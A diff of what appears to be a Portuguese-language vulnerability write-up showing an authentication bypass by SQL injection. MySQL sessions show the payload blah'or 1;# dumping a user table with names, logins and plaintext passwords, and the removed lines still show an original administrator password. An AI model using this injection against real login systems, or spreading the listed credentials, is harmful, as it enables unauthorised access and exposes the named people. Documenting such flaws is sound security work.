@@ -19,26 +19,26 @@
 - Bypass na autenticação :
 
 
-		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='farsoft01';
+		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='TESTE01';
 .................
 +---------------+-------+-----------+
 | nome_usuario  | login | senha     |
 +---------------+-------+-----------+
-| ADMINISTRADOR | ADM   | FARSOFT01 |
+| ADMINISTRADOR | ADM   | TESTE01 |
 +---------------+-------+-----------+
 1 row in set (0.00 sec)
 
-		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah';#'farsoft01';
+		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah';#'TESTE01';
 		Empty set (0.00 sec)
 .................
 
-		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah'or 1;#'farsoft01';
+		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah'or 1;#'TESTE01';
 
 .................
 +-------------------------------------------+---------------+-----------+
 | nome_usuario                              | login         | senha     |
 +-------------------------------------------+---------------+-----------+
-| ADMINISTRADOR                             | ADM           | FARSOFT01 |
+| ADMINISTRADOR                             | ADM           | TESTE01 |
 | MAYCON DOUGLAS DA SILVA                   | MAYCON        | 123       |
 | MESSIAS JOSE DA SILVA                     | MESSIAS       | 123       |
 | PETER MATEUS DA SILVA                     | PETER         | 240219    |
